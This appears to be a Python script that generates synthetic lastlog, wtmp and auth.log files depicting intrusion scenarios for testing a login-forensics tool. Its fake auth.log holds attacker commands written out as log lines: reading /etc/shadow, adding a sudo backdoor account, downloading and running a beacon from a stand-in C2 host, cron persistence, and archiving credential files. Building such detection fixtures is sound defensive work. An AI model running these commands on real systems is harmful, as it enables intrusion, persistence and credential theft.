#!/usr/bin/env python3
"""
Generate sample lastlog binary files for testing LastLog-Audit.

Each record in a lastlog file is 292 bytes (struct lastlog):
    - uint32  ll_time    (4 bytes)  - login timestamp (epoch)
    - char    ll_line[32] (32 bytes) - terminal name (tty/pts)
    - char    ll_host[256] (256 bytes) - remote hostname/IP

Records are indexed by UID: the record for UID N starts at offset N * 292.
A zero timestamp means the account has never logged in.

Usage:
    python3 samples/generate_samples.py
"""

import struct
import os
from datetime import datetime

RECORD_FORMAT = "I32s256s"
RECORD_SIZE = struct.calcsize(RECORD_FORMAT)

# struct utmp on Linux x86_64: 384 bytes total.
UTMP_FORMAT = "hhi32s4s32s256shhiii4I20s"
UTMP_SIZE = struct.calcsize(UTMP_FORMAT)

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
SAMPLES_DIR = os.path.join(os.path.dirname(SCRIPT_DIR), "samples")

# utmp type constants.
UT_USER_PROCESS = 7
UT_DEAD_PROCESS = 8


def make_record(timestamp: int, tty: str, host: str) -> bytes:
    """Pack a single lastlog record."""
    return struct.pack(
        RECORD_FORMAT,
        timestamp,
        tty.encode().ljust(32, b'\x00')[:32],
        host.encode().ljust(256, b'\x00')[:256],
    )


def make_utmp_record(
    ut_type: int, pid: int, line: str, ut_id: str,
    user: str, host: str, timestamp: int
) -> bytes:
    """Pack a single struct utmp record (384 bytes)."""
    return struct.pack(
        UTMP_FORMAT,
        ut_type,
        0,                                              # padding
        pid,
        line.encode().ljust(32, b'\x00')[:32],
        ut_id.encode().ljust(4, b'\x00')[:4],
        user.encode().ljust(32, b'\x00')[:32],
        host.encode().ljust(256, b'\x00')[:256],
        0, 0,                                           # exit status
        0,                                              # session
        timestamp,
        0,                                              # tv_usec
        0, 0, 0, 0,                                     # addr_v6
        b'\x00' * 20,                                   # unused
    )


def empty_record() -> bytes:
    return b'\x00' * RECORD_SIZE


def ts(date_str: str) -> int:
    return int(datetime.strptime(date_str, "%Y-%m-%d %H:%M").timestamp())


def write_lastlog(path: str, records: dict):
    max_uid = max(records.keys())
    with open(path, 'wb') as f:
        for uid in range(max_uid + 1):
            if uid in records:
                timestamp, tty, host = records[uid]
                f.write(make_record(timestamp, tty, host))
            else:
                f.write(empty_record())


def generate_clean_server():
    """
    clean_server.lastlog - Normal production Linux server.

    Regular admin activity from internal network. One stale account.
    Baseline for comparison with compromised scenarios.
    """
    records = {
        0:    (ts("2026-03-15 09:30"), "pts/0",  "10.0.1.50"),
        1000: (ts("2026-03-27 14:22"), "pts/1",  "10.0.1.101"),
        1001: (ts("2026-03-26 08:45"), "pts/2",  "10.0.1.102"),
        1002: (ts("2026-03-20 17:10"), "pts/0",  "10.0.1.103"),
        1003: (ts("2026-01-05 11:00"), "pts/3",  "10.0.1.50"),
    }

    path = os.path.join(SAMPLES_DIR, "clean_server.lastlog")
    write_lastlog(path, records)
    print(f"[+] {path}")
    print(f"    Baseline: 5 accounts, normal internal SSH, 1 stale (UID 1003)")


def generate_compromised():
    """
    compromised.lastlog - Active intrusion indicators.

    Scenario: attacker gained initial access via exposed SSH, pivoted to
    a dormant service account, and created a backdoor user.

    IOCs:
    - root login at 03:47 from known Tor exit node (185.220.101.34)
    - Dormant account UID 1005 reactivated from another Tor exit
    - New UID 1006 logged in from same IP as root (lateral movement)
    - UID 1004 exists but never logged in (phantom/backdoor account)
    """
    records = {
        0:    (ts("2026-03-28 03:47"), "pts/0",  "185.220.101.34"),
        1000: (ts("2026-03-27 14:22"), "pts/1",  "10.0.1.101"),
        1001: (ts("2026-03-26 08:45"), "pts/2",  "10.0.1.102"),
        1002: (ts("2026-03-25 17:10"), "pts/0",  "10.0.1.103"),
        1003: (ts("2026-01-05 11:00"), "pts/3",  "10.0.1.50"),
        1005: (ts("2026-03-28 03:52"), "pts/4",  "45.153.160.140"),
        1006: (ts("2026-03-28 04:01"), "pts/5",  "185.220.101.34"),
    }

    path = os.path.join(SAMPLES_DIR, "compromised.lastlog")
    write_lastlog(path, records)
    print(f"[+] {path}")
    print(f"    Active intrusion: root from Tor, dormant account reactivated, same-IP pivot")


def generate_timestomped():
    """
    timestomped.lastlog - Anti-forensic log tampering (T1070.006).

    Scenario: attacker gained root, zeroed their lastlog record to erase
    evidence, and manipulated timestamps on another account.

    IOCs:
    - UID 0 (root) has timestamp=0 despite being an active system
    - UID 1001 has a future timestamp (2027) indicating clock manipulation
    """
    records = {
        1000: (ts("2026-03-27 14:22"), "pts/1",  "10.0.1.101"),
        1001: (ts("2027-01-01 00:00"), "pts/0",  "10.0.1.200"),
        1002: (ts("2026-03-20 09:30"), "pts/2",  "10.0.1.102"),
    }

    path = os.path.join(SAMPLES_DIR, "timestomped.lastlog")
    write_lastlog(path, records)
    print(f"[+] {path}")
    print(f"    Anti-forensics: root record zeroed, future timestamp on UID 1001")


def generate_apt_cozy_bear():
    """
    apt_cozy_bear.lastlog - APT29 (Cozy Bear / The Dukes) style intrusion.

    Scenario inspired by APT29 TTPs: long-dwell compromise of a government
    research server. Attacker maintained persistent access over months via
    a compromised service account, operating during target timezone business
    hours to blend with legitimate traffic. Periodic check-ins from rotating
    infrastructure.

    Ref: MITRE ATT&CK Group G0016
    """
    records = {
        0:    (ts("2026-03-25 10:15"), "pts/0",  "10.0.1.50"),
        1000: (ts("2026-03-27 14:22"), "pts/1",  "10.0.1.101"),
        1001: (ts("2026-03-26 08:45"), "pts/2",  "10.0.1.102"),
        1002: (ts("2025-06-14 09:32"), "pts/3",  "193.29.56.122"),
        1003: (ts("2025-09-03 10:47"), "pts/3",  "91.219.236.18"),
        1004: (ts("2025-12-11 11:05"), "pts/3",  "5.45.65.52"),
        1005: (ts("2026-03-22 09:58"), "pts/3",  "45.133.1.71"),
    }

    path = os.path.join(SAMPLES_DIR, "apt_cozy_bear.lastlog")
    write_lastlog(path, records)
    print(f"[+] {path}")
    print(f"    APT29 style: 9-month dwell time, rotating C2 IPs, business-hours logins")


def generate_apt_lazarus():
    """
    apt_lazarus.lastlog - Lazarus Group (APT38 / HIDDEN COBRA) style.

    Scenario: cryptocurrency exchange server. Attacker compromised a dev
    account, escalated to root, and used the server as a staging point.
    Activity concentrated in UTC+9 evening hours (NK operating hours).
    Multiple accounts compromised in rapid succession.

    Ref: MITRE ATT&CK Group G0032
    """
    records = {
        0:    (ts("2026-03-27 22:14"), "pts/0",  "175.45.176.3"),
        1000: (ts("2026-03-27 14:00"), "pts/1",  "10.0.1.101"),
        1001: (ts("2026-03-27 21:45"), "pts/2",  "175.45.176.3"),
        1002: (ts("2026-03-27 22:03"), "pts/3",  "175.45.176.3"),
        1003: (ts("2026-03-27 22:18"), "pts/4",  "175.45.176.3"),
        1004: (ts("2026-03-27 22:31"), "pts/5",  "175.45.176.3"),
    }

    path = os.path.join(SAMPLES_DIR, "apt_lazarus.lastlog")
    write_lastlog(path, records)
    print(f"[+] {path}")
    print(f"    Lazarus style: rapid multi-account compromise, single C2, NK hours")


def generate_insider_threat():
    """
    insider_threat.lastlog - Malicious insider / disgruntled employee.

    Scenario: sysadmin (franckferman) with legitimate access starts
    accessing systems outside normal hours and from personal devices.
    Pattern shift from internal-only to mixed internal/external access.
    """
    records = {
        0:    (ts("2026-03-15 09:30"), "pts/0",  "10.0.1.50"),
        1000: (ts("2026-03-28 02:15"), "pts/0",  "82.65.140.27"),
        1001: (ts("2026-03-27 14:22"), "pts/1",  "10.0.1.101"),
        1002: (ts("2026-03-26 08:45"), "pts/2",  "10.0.1.102"),
        1003: (ts("2026-03-28 02:47"), "pts/1",  "82.65.140.27"),
        1004: (ts("2026-03-28 03:12"), "pts/2",  "82.65.140.27"),
    }

    path = os.path.join(SAMPLES_DIR, "insider_threat.lastlog")
    write_lastlog(path, records)
    print(f"[+] {path}")
    print(f"    Insider threat: franckferman accessing multiple accounts at 2-3 AM from home IP")


def generate_brute_force():
    """
    brute_force.lastlog - Successful brute force / credential stuffing.

    Scenario: exposed SSH on a web server. Attacker brute-forced multiple
    accounts. Several low-privilege accounts compromised in sequence from
    the same IP, then escalation to root.
    """
    records = {
        0:    (ts("2026-03-28 06:44"), "pts/0",  "194.26.29.113"),
        33:   (ts("2026-03-28 06:31"), "pts/1",  "194.26.29.113"),
        1000: (ts("2026-03-27 14:22"), "pts/1",  "10.0.1.101"),
        1001: (ts("2026-03-28 06:33"), "pts/2",  "194.26.29.113"),
        1002: (ts("2026-03-28 06:35"), "pts/3",  "194.26.29.113"),
        1003: (ts("2026-03-28 06:38"), "pts/4",  "194.26.29.113"),
        1004: (ts("2026-03-28 06:41"), "pts/5",  "194.26.29.113"),
    }

    path = os.path.join(SAMPLES_DIR, "brute_force.lastlog")
    write_lastlog(path, records)
    print(f"[+] {path}")
    print(f"    Brute force: 5 accounts + root from same IP in 13 minutes")


def generate_supply_chain():
    """
    supply_chain.lastlog - Supply chain compromise / CI-CD pivot.

    Scenario: attacker compromised a CI/CD service account (jenkins, gitlab-runner)
    and used it to pivot. The service account normally never has interactive logins.
    Access from cloud provider IP ranges suggests compromised pipeline.
    """
    records = {
        0:    (ts("2026-03-20 09:30"), "pts/0",  "10.0.1.50"),
        110:  (ts("2026-03-28 01:17"), "pts/0",  "34.89.172.44"),
        111:  (ts("2026-03-28 01:22"), "pts/1",  "35.205.94.18"),
        1000: (ts("2026-03-27 14:22"), "pts/1",  "10.0.1.101"),
        1001: (ts("2026-03-26 08:45"), "pts/2",  "10.0.1.102"),
    }

    path = os.path.join(SAMPLES_DIR, "supply_chain.lastlog")
    write_lastlog(path, records)
    print(f"[+] {path}")
    print(f"    Supply chain: service accounts (UID 110/111) with interactive logins from GCP IPs")


def generate_pentest_engagement():
    """
    pentest_engagement.lastlog - Authorized red team engagement.

    Scenario: franckferman conducting an authorized pentest. Initial access
    via compromised web app credentials, escalation to root, then lateral
    movement to database server account. Clean timestamps, professional
    operation during agreed testing window.
    """
    records = {
        0:    (ts("2026-03-28 10:34"), "pts/0",  "10.10.14.7"),
        1000: (ts("2026-03-27 14:22"), "pts/1",  "10.0.1.101"),
        1001: (ts("2026-03-28 10:22"), "pts/2",  "10.10.14.7"),
        1002: (ts("2026-03-28 10:28"), "pts/3",  "10.10.14.7"),
        1003: (ts("2026-03-28 10:45"), "pts/4",  "10.10.14.7"),
    }

    path = os.path.join(SAMPLES_DIR, "pentest_engagement.lastlog")
    write_lastlog(path, records)
    print(f"[+] {path}")
    print(f"    Pentest by franckferman: initial access -> privesc -> lateral, HTB-style 10.10.14.x")


def generate_compromised_wtmp():
    """
    compromised.wtmp - Active intrusion with full login/logout timeline.

    Scenario: mirrors compromised.lastlog but with temporal depth. The attacker
    SSHed in as root from a Tor exit node at 03:47, reactivated a dormant
    service account (svc_backup) at 03:52, then pivoted to a freshly created
    backdoor account (implant) at 04:01. Legitimate admin sessions from the
    previous day provide contrast. Logout records included to show session
    durations and detect lingering shells.

    IOCs:
    - root login from Tor exit node 185.220.101.34
    - Dormant svc_backup reactivated from 45.153.160.140
    - New implant account from same IP as root (lateral movement)
    - root session still open (no matching DEAD_PROCESS)
    """
    entries = []

    # Legitimate admin sessions from the previous day.
    entries.append(make_utmp_record(
        UT_USER_PROCESS, 12001, "pts/1", "ts/1",
        "admin", "10.0.1.101", ts("2026-03-27 14:22"),
    ))
    entries.append(make_utmp_record(
        UT_DEAD_PROCESS, 12001, "pts/1", "ts/1",
        "", "", ts("2026-03-27 17:45"),
    ))
    entries.append(make_utmp_record(
        UT_USER_PROCESS, 12050, "pts/2", "ts/2",
        "dev", "10.0.1.102", ts("2026-03-27 08:45"),
    ))
    entries.append(make_utmp_record(
        UT_DEAD_PROCESS, 12050, "pts/2", "ts/2",
        "", "", ts("2026-03-27 12:30"),
    ))

    # Attacker: root from Tor exit node.
    entries.append(make_utmp_record(
        UT_USER_PROCESS, 31337, "pts/0", "ts/0",
        "root", "185.220.101.34", ts("2026-03-28 03:47"),
    ))

    # Attacker: reactivated dormant service account.
    entries.append(make_utmp_record(
        UT_USER_PROCESS, 31338, "pts/4", "ts/4",
        "svc_backup", "45.153.160.140", ts("2026-03-28 03:52"),
    ))
    entries.append(make_utmp_record(
        UT_DEAD_PROCESS, 31338, "pts/4", "ts/4",
        "", "", ts("2026-03-28 03:58"),
    ))

    # Attacker: backdoor account from same IP as root.
    entries.append(make_utmp_record(
        UT_USER_PROCESS, 31339, "pts/5", "ts/5",
        "implant", "185.220.101.34", ts("2026-03-28 04:01"),
    ))
    entries.append(make_utmp_record(
        UT_DEAD_PROCESS, 31339, "pts/5", "ts/5",
        "", "", ts("2026-03-28 04:14"),
    ))

    # Note: root session (PID 31337) has no DEAD_PROCESS - still open.

    path = os.path.join(SAMPLES_DIR, "compromised.wtmp")
    with open(path, 'wb') as f:
        for entry in entries:
            f.write(entry)

    print(f"[+] {path}")
    print(f"    Active intrusion (wtmp): root from Tor, dormant account reactivated, backdoor pivot")
    print(f"    {len(entries)} utmp records, root session still open (no logout)")


def generate_compromised_auth_log():
    """
    compromised.auth.log - Syslog matching the compromised scenario.

    Timeline: brute force from Tor exit node, successful root login,
    backdoor account creation, C2 beacon download, persistence, exfiltration.
    """
    lines = [
        "Mar 27 03:41:07 prod-web-01 sshd[4412]: Failed password for root from 185.220.101.34 port 44231 ssh2",
        "Mar 27 03:41:09 prod-web-01 sshd[4412]: Failed password for root from 185.220.101.34 port 44231 ssh2",
        "Mar 27 03:41:12 prod-web-01 sshd[4413]: Failed password for root from 185.220.101.34 port 44232 ssh2",
        "Mar 27 03:41:15 prod-web-01 sshd[4414]: Failed password for root from 185.220.101.34 port 44233 ssh2",
        "Mar 27 03:41:18 prod-web-01 sshd[4415]: Failed password for root from 185.220.101.34 port 44234 ssh2",
        "Mar 27 03:42:33 prod-web-01 sshd[4420]: Failed password for admin from 185.220.101.34 port 44240 ssh2",
        "Mar 27 03:42:36 prod-web-01 sshd[4421]: Failed password for admin from 185.220.101.34 port 44241 ssh2",
        "Mar 27 03:43:01 prod-web-01 sshd[4425]: Failed password for deploy from 185.220.101.34 port 44245 ssh2",
        "Mar 27 03:44:19 prod-web-01 sshd[4430]: Failed password for invalid user www-data from 185.220.101.34 port 44250 ssh2",
        "Mar 27 03:47:12 prod-web-01 sshd[4435]: Accepted password for root from 185.220.101.34 port 44260 ssh2",
        "Mar 27 03:47:34 prod-web-01 sudo:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow",
        "Mar 27 03:48:02 prod-web-01 sudo:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/useradd -m -s /bin/bash svc-backup",
        "Mar 27 03:48:15 prod-web-01 sudo:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo svc-backup",
        "Mar 27 03:49:01 prod-web-01 sudo:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/cp /root/.ssh/authorized_keys /home/svc-backup/.ssh/authorized_keys",
        "Mar 27 03:52:44 prod-web-01 sshd[4500]: Accepted publickey for svc-backup from 45.153.160.140 port 55100 ssh2",
        "Mar 27 04:01:18 prod-web-01 sshd[4550]: Accepted publickey for svc-backup from 185.220.101.34 port 55200 ssh2",
        "Mar 27 04:13:08 prod-web-01 sudo: svc-backup : TTY=pts/4 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl -o /tmp/.x https://paste.c2-infra.xyz/dl/beacon.elf",
        "Mar 27 04:13:29 prod-web-01 sudo: svc-backup : TTY=pts/4 ; PWD=/tmp ; USER=root ; COMMAND=/bin/chmod +x /tmp/.x",
        "Mar 27 04:13:33 prod-web-01 sudo: svc-backup : TTY=pts/4 ; PWD=/tmp ; USER=root ; COMMAND=/tmp/.x",
        "Mar 27 04:15:01 prod-web-01 sudo: svc-backup : TTY=pts/4 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/crontab -l",
        "Mar 27 04:15:18 prod-web-01 sudo: svc-backup : TTY=pts/4 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c echo '*/5 * * * * /tmp/.x' >> /var/spool/cron/crontabs/root",
        "Mar 27 14:00:22 prod-web-01 sshd[5100]: Accepted publickey for deploy from 10.0.5.22 port 60100 ssh2",
        "Mar 27 14:00:31 prod-web-01 sudo: svc-backup : TTY=pts/4 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/tar czf /tmp/.bak.tar.gz /etc/passwd /etc/shadow /home",
        "Mar 27 14:02:18 prod-web-01 sudo: svc-backup : TTY=pts/4 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/base64 /tmp/.bak.tar.gz",
        "Mar 28 02:10:05 prod-web-01 sshd[6001]: Failed password for invalid user scanner from 171.25.193.78 port 33100 ssh2",
        "Mar 28 02:10:08 prod-web-01 sshd[6002]: Failed password for invalid user scanner from 171.25.193.78 port 33101 ssh2",
        "Mar 28 02:10:11 prod-web-01 sshd[6003]: Failed password for invalid user admin from 171.25.193.78 port 33102 ssh2",
    ]

    path = os.path.join(SAMPLES_DIR, "compromised.auth.log")
    with open(path, 'w', encoding='utf-8') as f:
        f.write("\n".join(lines) + "\n")

    print(f"[+] {path}")
    print(f"    {len(lines)} syslog entries: brute force, root compromise, backdoor, C2, exfiltration")


def main():
    print("Generating sample files...\n")
    generate_clean_server()
    print()
    generate_compromised()
    print()
    generate_timestomped()
    print()
    generate_apt_cozy_bear()
    print()
    generate_apt_lazarus()
    print()
    generate_insider_threat()
    print()
    generate_brute_force()
    print()
    generate_supply_chain()
    print()
    generate_pentest_engagement()
    print()
    generate_compromised_wtmp()
    print()
    generate_compromised_auth_log()
    print("\nDone. 11 scenarios generated.")
    print("\nTest with:")
    print("  python3 LastLogAudit.py -f samples/compromised.lastlog")
    print("  python3 LastLogAudit.py --wtmp samples/compromised.wtmp")
    print("  python3 LastLogAudit.py --auth-log samples/compromised.auth.log")
    print("  python3 LastLogAudit.py -f samples/compromised.lastlog --wtmp samples/compromised.wtmp --auth-log samples/compromised.auth.log --correlate")


if __name__ == "__main__":
    main()
